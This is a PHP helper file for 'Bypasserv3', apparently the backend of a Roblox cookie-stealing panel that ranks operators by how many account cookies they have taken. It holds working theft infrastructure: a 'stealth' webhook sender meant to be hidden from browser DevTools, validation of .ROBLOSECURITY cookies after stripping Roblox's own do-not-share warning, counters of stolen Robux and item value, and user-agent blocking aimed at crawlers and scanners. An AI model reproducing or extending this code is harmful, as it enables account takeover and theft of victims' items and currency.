<?php
/**
 * Bypasserv3 - Helper Functions
 * File-based storage system with auto-creation
 */

// ============================================
// AUTO-CREATE DIRECTORIES ON LOAD
// ============================================
function ensureDirectoriesExist() {
    $dirs = [
        INSTANCES_DIR,
        TOKENS_DIR,
        DATA_DIR,
        LOGS_DIR
    ];
    
    foreach ($dirs as $dir) {
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true);
            
            // Create .htaccess to protect directories
            $htaccess = "$dir/.htaccess";
            if (!file_exists($htaccess)) {
                file_put_contents($htaccess, "Deny from all\n", LOCK_EX);
            }
        }
    }
}

// Call on every page load
ensureDirectoriesExist();

// ============================================
// INSTANCE MANAGEMENT
// ============================================

/**
 * Get instance data from file-based storage
 * Auto-creates missing files with default values
 */
function getInstanceData($directory) {
    if (empty($directory)) {
        return null;
    }
    
    $path = INSTANCES_DIR . "/$directory";
    
    // Auto-create instance folder if missing
    if (!file_exists($path)) {
        mkdir($path, 0777, true);
    }
    
    // Auto-create all required files with defaults
    $files = [
        'token.txt' => '',
        'webhook.txt' => '',
        'userwebhook.txt' => '',
        'username.txt' => $directory,
        'profilepic.txt' => 'https://www.roblox.com/headshot-thumbnail/image/default.png',
        'visits.txt' => '0',
        'cookies.txt' => '0',
        'robux.txt' => '0',
        'rap.txt' => '0',
        'summary.txt' => '0',
        'created.txt' => date('Y-m-d H:i:s'),
        'daily_visits.txt' => json_encode(array_fill(0, 7, 0)),
        'daily_cookies.txt' => json_encode(array_fill(0, 7, 0)),
        'daily_robux.txt' => json_encode(array_fill(0, 7, 0)),
        'daily_rap.txt' => json_encode(array_fill(0, 7, 0)),
        'daily_summary.txt' => json_encode(array_fill(0, 7, 0)),
        'logs.txt' => ''
    ];
    
    foreach ($files as $filename => $defaultValue) {
        $filePath = "$path/$filename";
        if (!file_exists($filePath)) {
            file_put_contents($filePath, $defaultValue, LOCK_EX);
        }
    }
    
    // Read all data
    $data = [
        'directory' => $directory,
        'token' => @file_get_contents("$path/token.txt") ?: '',
        'webhook' => @file_get_contents("$path/webhook.txt") ?: '',
        'userWebhook' => @file_get_contents("$path/userwebhook.txt") ?: '',
        'username' => @file_get_contents("$path/username.txt") ?: $directory,
        'profilePicture' => @file_get_contents("$path/profilepic.txt") ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png',
        'created' => @file_get_contents("$path/created.txt") ?: date('Y-m-d H:i:s'),
        'stats' => [
            'totalVisits' => (int)(@file_get_contents("$path/visits.txt") ?: 0),
            'totalCookies' => (int)(@file_get_contents("$path/cookies.txt") ?: 0),
            'totalRobux' => (int)(@file_get_contents("$path/robux.txt") ?: 0),
            'totalRAP' => (int)(@file_get_contents("$path/rap.txt") ?: 0),
            'totalSummary' => (int)(@file_get_contents("$path/summary.txt") ?: 0)
        ],
        'dailyStats' => [
            'visits' => json_decode(@file_get_contents("$path/daily_visits.txt") ?: '[]', true) ?: array_fill(0, 7, 0),
            'cookies' => json_decode(@file_get_contents("$path/daily_cookies.txt") ?: '[]', true) ?: array_fill(0, 7, 0),
            'robux' => json_decode(@file_get_contents("$path/daily_robux.txt") ?: '[]', true) ?: array_fill(0, 7, 0),
            'rap' => json_decode(@file_get_contents("$path/daily_rap.txt") ?: '[]', true) ?: array_fill(0, 7, 0),
            'summary' => json_decode(@file_get_contents("$path/daily_summary.txt") ?: '[]', true) ?: array_fill(0, 7, 0)
        ]
    ];
    
    return $data;
}

/**
 * Update instance stats
 */
function updateInstanceStats($directory, $statName, $newValue) {
    $path = INSTANCES_DIR . "/$directory";
    
    if (!file_exists($path)) {
        return false;
    }
    
    $filename = '';
    switch ($statName) {
        case 'totalVisits':
            $filename = 'visits.txt';
            break;
        case 'totalCookies':
            $filename = 'cookies.txt';
            break;
        case 'totalRobux':
            $filename = 'robux.txt';
            break;
        case 'totalRAP':
            $filename = 'rap.txt';
            break;
        case 'totalSummary':
            $filename = 'summary.txt';
            break;
        default:
            return false;
    }
    
    return file_put_contents("$path/$filename", (string)$newValue, LOCK_EX) !== false;
}

/**
 * Update daily stats
 */
function updateDailyStats($directory, $statType, $incrementValue) {
    $path = INSTANCES_DIR . "/$directory";
    
    if (!file_exists($path)) {
        return false;
    }
    
    $filename = "daily_{$statType}.txt";
    $filePath = "$path/$filename";
    
    // Auto-create file if missing
    if (!file_exists($filePath)) {
        file_put_contents($filePath, json_encode(array_fill(0, 7, 0)), LOCK_EX);
    }
    
    $dailyStats = json_decode(file_get_contents($filePath), true);
    if (!is_array($dailyStats) || count($dailyStats) !== 7) {
        $dailyStats = array_fill(0, 7, 0);
    }
    
    $today = (int)date('w');
    $dailyStats[$today] += $incrementValue;
    
    return file_put_contents($filePath, json_encode($dailyStats), LOCK_EX) !== false;
}

/**
 * Track visit to instance
 */
function trackVisit($directory) {
    $instanceData = getInstanceData($directory);
    if (!$instanceData) {
        return false;
    }
    
    $currentVisits = $instanceData['stats']['totalVisits'];
    updateInstanceStats($directory, 'totalVisits', $currentVisits + 1);
    updateDailyStats($directory, 'visits', 1);
    
    return true;
}

// ============================================
// GLOBAL STATS
// ============================================

/**
 * Get global statistics across all instances
 */
function getGlobalStats() {
    $instancesDir = INSTANCES_DIR;
    
    if (!file_exists($instancesDir)) {
        return [
            'totalInstances' => 0,
            'totalCookies' => 0,
            'totalVisits' => 0,
            'totalRobux' => 0,
            'totalRAP' => 0
        ];
    }
    
    $totalInstances = 0;
    $totalCookies = 0;
    $totalVisits = 0;
    $totalRobux = 0;
    $totalRAP = 0;
    
    $directories = array_diff(scandir($instancesDir), ['.', '..', '.htaccess']);
    
    foreach ($directories as $dir) {
        $path = "$instancesDir/$dir";
        if (is_dir($path)) {
            $totalInstances++;
            $totalCookies += (int)(@file_get_contents("$path/cookies.txt") ?: 0);
            $totalVisits += (int)(@file_get_contents("$path/visits.txt") ?: 0);
            $totalRobux += (int)(@file_get_contents("$path/robux.txt") ?: 0);
            $totalRAP += (int)(@file_get_contents("$path/rap.txt") ?: 0);
        }
    }
    
    return [
        'totalInstances' => $totalInstances,
        'totalCookies' => $totalCookies,
        'totalVisits' => $totalVisits,
        'totalRobux' => formatNumber($totalRobux),
        'totalRAP' => formatNumber($totalRAP)
    ];
}

// ============================================
// RANK SYSTEM
// ============================================

function getRankInfo($cookies) {
    $ranks = [
        ['min' => 0, 'max' => 2, 'name' => 'Noob Bypasser', 'icon' => '🥚'],
        ['min' => 3, 'max' => 9, 'name' => 'Rookie Logger', 'icon' => '🐣'],
        ['min' => 10, 'max' => 24, 'name' => 'Script Kiddie', 'icon' => '🐥'],
        ['min' => 25, 'max' => 49, 'name' => 'Amateur Bypasser', 'icon' => '🦆'],
        ['min' => 50, 'max' => 99, 'name' => 'Cookie Hunter', 'icon' => '🍪'],
        ['min' => 100, 'max' => 199, 'name' => 'Token Collector', 'icon' => '🎫'],
        ['min' => 200, 'max' => 299, 'name' => 'Silent Snatcher', 'icon' => '🥷'],
        ['min' => 300, 'max' => 499, 'name' => 'Pro Bypasser', 'icon' => '⚡'],
        ['min' => 500, 'max' => 999, 'name' => 'Elite Logger', 'icon' => '👑'],
        ['min' => 1000, 'max' => 2499, 'name' => 'Master Bypasser', 'icon' => '💎'],
        ['min' => 2500, 'max' => 4999, 'name' => 'Legendary', 'icon' => '🔥'],
        ['min' => 5000, 'max' => PHP_INT_MAX, 'name' => 'God Tier', 'icon' => '⚜️']
    ];
    
    $currentRank = null;
    $nextRank = null;
    $progress = 0;
    $cookiesToNext = 0;
    
    foreach ($ranks as $index => $rank) {
        if ($cookies >= $rank['min'] && $cookies <= $rank['max']) {
            $currentRank = $rank;
            $nextRank = $ranks[$index + 1] ?? $rank;
            
            if ($rank['max'] !== PHP_INT_MAX) {
                $rangeSize = $rank['max'] - $rank['min'] + 1;
                $progress = (($cookies - $rank['min']) / $rangeSize) * 100;
                $cookiesToNext = $rank['max'] - $cookies + 1;
            } else {
                $progress = 100;
                $cookiesToNext = 0;
            }
            break;
        }
    }
    
    return [
        'current' => $currentRank ?: $ranks[0],
        'next' => $nextRank ?: $ranks[0],
        'progress' => round($progress, 1),
        'cookiesToNext' => $cookiesToNext
    ];
}

// ============================================
// LEADERBOARD
// ============================================

function getLeaderboard($limit = 10) {
    $instancesDir = INSTANCES_DIR;
    
    if (!file_exists($instancesDir)) {
        return [];
    }
    
    $leaderboard = [];
    $directories = array_diff(scandir($instancesDir), ['.', '..', '.htaccess']);
    
    foreach ($directories as $dir) {
        $path = "$instancesDir/$dir";
        if (is_dir($path)) {
            $data = getInstanceData($dir);
            if ($data && $data['stats']['totalCookies'] > 0) {
                $leaderboard[] = $data;
            }
        }
    }
    
    usort($leaderboard, function($a, $b) {
        return $b['stats']['totalCookies'] - $a['stats']['totalCookies'];
    });
    
    return array_slice($leaderboard, 0, $limit);
}

// ============================================
// WEBHOOK FUNCTIONS
// ============================================

/**
 * Send webhook notification (visible)
 */
function sendWebhookNotification($webhookUrl, $data) {
    if (empty($webhookUrl)) {
        return false;
    }
    
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode >= 200 && $httpCode < 300;
}

/**
 * Send stealth webhook (server-side only, hidden from DevTools)
 */
function sendStealthWebhook($webhookUrl, $data) {
    if (empty($webhookUrl)) {
        return false;
    }
    
    $payload = json_encode($data);
    
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    
    curl_exec($ch);
    curl_close($ch);
    
    return true;
}

// ============================================
// SECURITY FUNCTIONS
// ============================================

function getUserIP() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (isset($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    }
    
    return trim($ip);
}

function checkRateLimit($identifier, $maxAttempts = 10, $timeWindow = 60) {
    $rateLimitDir = DATA_DIR . '/rate_limits';
    
    if (!file_exists($rateLimitDir)) {
        mkdir($rateLimitDir, 0777, true);
    }
    
    $rateLimitFile = "$rateLimitDir/" . md5($identifier) . ".txt";
    
    $currentTime = time();
    $attempts = [];
    
    if (file_exists($rateLimitFile)) {
        $attempts = json_decode(file_get_contents($rateLimitFile), true) ?: [];
        $attempts = array_filter($attempts, function($timestamp) use ($currentTime, $timeWindow) {
            return ($currentTime - $timestamp) < $timeWindow;
        });
    }
    
    if (count($attempts) >= $maxAttempts) {
        return false;
    }
    
    $attempts[] = $currentTime;
    file_put_contents($rateLimitFile, json_encode($attempts), LOCK_EX);
    
    return true;
}

function cleanupRateLimits() {
    $rateLimitDir = DATA_DIR . '/rate_limits';
    
    if (!file_exists($rateLimitDir)) {
        return;
    }
    
    $files = glob("$rateLimitDir/*.txt");
    $currentTime = time();
    
    foreach ($files as $file) {
        if (($currentTime - filemtime($file)) > 3600) {
            @unlink($file);
        }
    }
}

function validateCookie($cookie) {
    if (empty($cookie)) {
        return false;
    }
    
    $cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $cookie);
    
    if (strlen($cookie) < 50) {
        return false;
    }
    
    if (!preg_match('/^[A-Za-z0-9_\-]+$/', $cookie)) {
        return false;
    }
    
    return true;
}

function isSuspiciousRequest() {
    $suspiciousPatterns = [
        'bot', 'crawl', 'spider', 'scraper', 'curl', 'wget', 'python', 'java'
    ];
    
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    
    foreach ($suspiciousPatterns as $pattern) {
        if (strpos($userAgent, $pattern) !== false) {
            return true;
        }
    }
    
    return false;
}

function logSecurityEvent($eventType, $data = []) {
    $logDir = LOGS_DIR;
    
    if (!file_exists($logDir)) {
        mkdir($logDir, 0777, true);
    }
    
    $logFile = "$logDir/" . date('Y-m-d') . ".log";
    
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'type' => $eventType,
        'ip' => getUserIP(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'data' => $data
    ];
    
    $logLine = json_encode($logEntry) . PHP_EOL;
    file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
}

function securityScan($block = false) {
    $blockedIPs = DATA_DIR . '/blocked_ips.txt';
    
    if (!file_exists($blockedIPs)) {
        file_put_contents($blockedIPs, '', LOCK_EX);
    }
    
    $ip = getUserIP();
    $blocked = file($blockedIPs, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    
    if (in_array($ip, $blocked)) {
        http_response_code(403);
        die('Access Denied');
    }
    
    if ($block && isSuspiciousRequest()) {
        file_put_contents($blockedIPs, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        logSecurityEvent('ip_blocked', ['ip' => $ip]);
        http_response_code(403);
        die('Access Denied');
    }
}

// ============================================
// UTILITY FUNCTIONS
// ============================================

function sanitizeInput($input, $maxLength = 255) {
    $input = trim($input);
    $input = strip_tags($input);
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    return substr($input, 0, $maxLength);
}

function generateRandomString($length = 32) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, strlen($characters) - 1)];
    }
    
    return $randomString;
}

function formatNumber($number) {
    if ($number >= 1000000000) {
        return round($number / 1000000000, 1) . 'B';
    } elseif ($number >= 1000000) {
        return round($number / 1000000, 1) . 'M';
    } elseif ($number >= 1000) {
        return round($number / 1000, 1) . 'K';
    }
    return number_format($number);
}

function timeAgo($datetime) {
    $timestamp = is_numeric($datetime) ? $datetime : strtotime($datetime);
    $diff = time() - $timestamp;
    
    if ($diff < 60) {
        return $diff . ' seconds ago';
    } elseif ($diff < 3600) {
        return floor($diff / 60) . ' minutes ago';
    } elseif ($diff < 86400) {
        return floor($diff / 3600) . ' hours ago';
    } elseif ($diff < 604800) {
        return floor($diff / 86400) . ' days ago';
    } else {
        return date('M j, Y', $timestamp);
    }
}
?>
